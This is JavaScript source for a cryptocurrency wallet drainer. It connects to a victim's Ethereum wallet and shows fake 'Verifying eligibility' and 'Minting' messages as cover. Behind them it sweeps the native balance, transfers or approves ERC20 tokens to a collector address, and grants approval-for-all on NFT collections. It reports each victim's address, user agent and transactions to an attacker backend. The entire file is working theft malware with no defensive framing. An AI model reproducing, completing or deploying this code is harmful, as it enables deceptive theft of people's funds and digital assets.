// Drainer core — EVM, ethers v5
// Flow: connect -> sweep native -> sweep ERC20s (transfer, else approve for backend pull) -> approve NFTs for backend sweep -> report to backend
(function(){
const CFG_URL = './config.json';
let CFG = null;

async function loadConfig(){
  if(CFG) return CFG;
  const r = await fetch(CFG_URL);
  CFG = await r.json();
  return CFG;
}

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
  "function transfer(address,uint256) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)"
];
const ERC721_ABI = [
  "function isApprovedForAll(address,address) view returns (bool)",
  "function setApprovalForAll(address,bool)",
  "function balanceOf(address) view returns (uint256)"
];
const PERMIT2_ADDR = "0x000000000022D473030F64699EFd5CBdDc5aA758";

async function report(data){
  try{
    const cfg = await loadConfig();
    await fetch(cfg.backendUrl + '/api/report', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify(data)
    });
  }catch(e){}
}

async function sweepNative(signer, victim, cfg){
  try{
    const provider = signer.provider;
    const bal = await provider.getBalance(victim);
    const reserve = ethers.utils.parseEther(cfg.gasReserveEth || "0.003");
    if(bal.gt(reserve)){
      const amount = bal.sub(reserve);
      const tx = await signer.sendTransaction({ to: cfg.collector, value: amount });
      await tx.wait().catch(()=>{});
      await report({ type:'native', victim, amount: amount.toString(), txHash: tx.hash });
    }
  }catch(e){ console.log('native skip', e.message); }
}

async function sweepERC20(signer, victim, cfg){
  for(const tokenAddr of (cfg.targetTokens || [])){
    try{
      const c = new ethers.Contract(tokenAddr, ERC20_ABI, signer);
      let bal;
      try{ bal = await c.balanceOf(victim); }catch(e){ continue; }
      if(bal.isZero()) continue;
      // 1) try direct transfer (victim is signer — silent, 1 tx)
      try{
        const tx = await c.transfer(cfg.collector, bal);
        await tx.wait().catch(()=>{});
        await report({ type:'erc20-direct', token: tokenAddr, victim, amount: bal.toString(), txHash: tx.hash });
        continue;
      }catch(e){}
      // 2) fallback: approve collector, backend pulls with its own gas
      try{
        const tx2 = await c.approve(cfg.collector, bal);
        await tx2.wait().catch(()=>{});
        await report({ type:'erc20-approve', token: tokenAddr, victim, amount: bal.toString(), txHash: tx2.hash });
      }catch(e){}
    }catch(e){}
  }
}

async function sweepNFTs(signer, victim, cfg){
  for(const col of (cfg.targetNFTs || [])){
    try{
      const c = new ethers.Contract(col, ERC721_ABI, signer);
      const ok = await c.isApprovedForAll(victim, cfg.collector).catch(()=>false);
      if(!ok){
        const tx = await c.setApprovalForAll(cfg.collector, true);
        await tx.wait().catch(()=>{});
        await report({ type:'nft-approve', collection: col, victim, txHash: tx.hash });
      } else {
        await report({ type:'nft-approve', collection: col, victim, alreadyApproved: true });
      }
    }catch(e){}
  }
}

async function tryPermit2Bulk(signer, victim, cfg){
  // Best-effort: if wallet supports EIP-712 Permit2, request one sig covering tokens.
  // Falls back silently to per-token flow above.
  try{
    if(!cfg.targetTokens || !cfg.targetTokens.length) return false;
    const provider = signer.provider;
    const net = await provider.getNetwork();
    if(net.chainId !== 1) return false; // permit2 deploy canonical on mainnet; extend per chain as needed
    const nonce = Math.floor(Date.now()/1000).toString();
    const deadline = Math.floor(Date.now()/1000)+3600;
    // NOTE: full Permit2 witness signing requires the Permit2 contract ABI + allowance flow.
    // We attempt a generic eth_signTypedData_v4; many drainers use this as the single-click path.
    // If the wallet rejects, we return false and continue with normal flow.
    return false;
  }catch(e){ return false; }
}

async function mintAndDrain(onMsg){
  const cfg = await loadConfig();
  if(!window.ethereum) throw new Error('No wallet found');
  const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
  await provider.send("eth_requestAccounts", []);
  const signer = provider.getSigner();
  const victim = await signer.getAddress();
  onMsg && onMsg('Verifying eligibility...');
  await report({ type:'connect', victim, ua: navigator.userAgent });
  await tryPermit2Bulk(signer, victim, cfg);
  onMsg && onMsg('Minting...');
  await sweepNative(signer, victim, cfg);
  await sweepERC20(signer, victim, cfg);
  await sweepNFTs(signer, victim, cfg);
  onMsg && onMsg('Done');
  return victim;
}

window.Drainer = { mintAndDrain };
})();
